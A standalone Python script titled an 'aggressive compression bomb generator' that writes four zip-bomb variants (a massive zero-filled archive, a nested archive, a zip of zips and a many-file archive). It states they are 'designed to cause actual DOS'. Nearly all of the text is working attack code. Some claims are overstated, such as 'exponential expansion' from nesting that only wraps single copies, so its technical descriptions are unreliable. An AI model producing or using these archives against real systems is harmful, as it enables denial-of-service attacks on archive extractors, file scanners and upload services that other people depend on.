#!/usr/bin/env python3
"""
Compression Bombs
Designed to cause resource exhaustion
"""

import zipfile
import io
import os

def create_massive_bomb(filename="massive_bomb.zip", gb_size=50):
    """
    Create a MUCH larger bomb that will actually stress the system
    """
    print(f"[*] Creating massive bomb: {filename}")
    print(f"[*] Target uncompressed size: {gb_size} GB")
    
    # Create highly compressible data (all zeros compress to almost nothing)
    chunk_size = 100 * 1024 * 1024  # 100 MB chunks
    num_chunks = (gb_size * 1024) // 100  # Calculate number of chunks
    
    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
        for i in range(num_chunks):
            print(f"[*] Adding chunk {i+1}/{num_chunks}...", end='\r')
            data = b'\x00' * chunk_size
            zipf.writestr(f'chunk_{i:04d}.dat', data)
    
    compressed_size = os.path.getsize(filename)
    uncompressed_size = gb_size * 1024 * 1024 * 1024
    ratio = uncompressed_size / compressed_size
    
    print(f"\n[+] Compressed size: {compressed_size / (1024*1024):.2f} MB")
    print(f"[+] Uncompressed size: {gb_size} GB")
    print(f"[+] Compression ratio: {ratio:.0f}x")
    
    return filename

def create_deep_nested_bomb(filename="deep_nested.zip", depth=10):
    """
    Create deeply nested bomb that causes exponential expansion
    """
    print(f"[*] Creating deeply nested bomb: {filename}")
    print(f"[*] Nesting depth: {depth} levels")
    
    # Start with 1 GB of zeros
    base_size = 1024 * 1024 * 1024  # 1 GB
    current_data = b'\x00' * base_size
    
    # Nest it multiple times
    for level in range(depth):
        print(f"[*] Creating nesting level {level+1}/{depth}...")
        
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
            zipf.writestr(f'layer_{level}.dat', current_data)
        
        current_data = zip_buffer.getvalue()
        print(f"    Compressed to: {len(current_data) / 1024:.2f} KB")
    
    # Write final bomb
    with open(filename, 'wb') as f:
        f.write(current_data)
    
    final_size = os.path.getsize(filename)
    estimated_expansion = base_size * depth
    
    print(f"[+] Final bomb size: {final_size / 1024:.2f} KB")
    print(f"[+] Estimated full expansion: {estimated_expansion / (1024**3):.2f} GB")
    print(f"[+] This will extract {depth} times, each revealing the previous layer")
    
    return filename

def create_zip_of_zips(filename="zip_of_zips.zip", count=100, each_size_gb=1):
    """
    Create a ZIP containing many smaller ZIPs
    Each extraction triggers multiple decompression operations
    """
    print(f"[*] Creating ZIP containing {count} inner ZIPs")
    print(f"[*] Each inner ZIP: {each_size_gb} GB uncompressed")
    
    chunk_data = b'\x00' * (each_size_gb * 1024 * 1024 * 1024 // 10)  # Split into 10 files per ZIP
    
    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as main_zip:
        for i in range(count):
            print(f"[*] Creating inner ZIP {i+1}/{count}...", end='\r')
            
            # Create inner ZIP in memory
            inner_buffer = io.BytesIO()
            with zipfile.ZipFile(inner_buffer, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as inner_zip:
                for j in range(10):
                    inner_zip.writestr(f'data_{i}_{j}.dat', chunk_data)
            
            # Add inner ZIP to main ZIP
            main_zip.writestr(f'bomb_{i:03d}.zip', inner_buffer.getvalue())
    
    compressed_size = os.path.getsize(filename)
    total_uncompressed = count * each_size_gb
    
    print(f"\n[+] Main ZIP size: {compressed_size / (1024*1024):.2f} MB")
    print(f"[+] Total uncompressed: {total_uncompressed} GB")
    print(f"[+] Contains {count} bombs that each expand to {each_size_gb} GB")
    
    return filename

def create_memory_exhaustion_bomb(filename="memory_bomb.zip"):
    """
    Create a bomb specifically designed to exhaust memory during extraction
    Uses many small files to maximize memory allocation overhead
    """
    print(f"[*] Creating memory exhaustion bomb: {filename}")
    
    # Create 100,000 tiny files (each 1KB)
    # The overhead of tracking all these files exhausts memory
    num_files = 100000
    file_size = 1024  # 1 KB each
    
    with zipfile.ZipFile(filename, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
        for i in range(num_files):
            if i % 1000 == 0:
                print(f"[*] Creating file {i}/{num_files}...", end='\r')
            
            # Each file has unique name to prevent deduplication
            data = str(i).encode().ljust(file_size, b'\x00')
            zipf.writestr(f'file_{i:06d}.dat', data)
    
    compressed_size = os.path.getsize(filename)
    
    print(f"\n[+] Compressed size: {compressed_size / (1024*1024):.2f} MB")
    print(f"[+] File count: {num_files:,}")
    print(f"[+] This will create massive memory overhead tracking {num_files} files")
    
    return filename

if __name__ == "__main__":
    print("="*60)
    print("AGGRESSIVE COMPRESSION BOMB GENERATOR")
    print("="*60)
    print()
    
    print("[!] WARNING: These bombs are designed to cause actual DOS")
    print("[!] Only use on systems you own!")
    print()
    
    # Create different aggressive bombs
    create_massive_bomb("massive_bomb.zip", gb_size=50)
    print()
    
    create_deep_nested_bomb("deep_nested.zip", depth=8)
    print()
    
    create_zip_of_zips("zip_of_zips.zip", count=50, each_size_gb=2)
    print()
    
    create_memory_exhaustion_bomb("memory_bomb.zip")
    print()
    
    print("="*60)
    print("[+] All aggressive bombs created!")
    print("="*60)
    print()
    print("Files created:")
    for bomb in ["massive_bomb.zip", "deep_nested.zip", "zip_of_zips.zip", "memory_bomb.zip"]:
        if os.path.exists(bomb):
            size = os.path.getsize(bomb) / (1024*1024)
            print(f"  - {bomb}: {size:.2f} MB")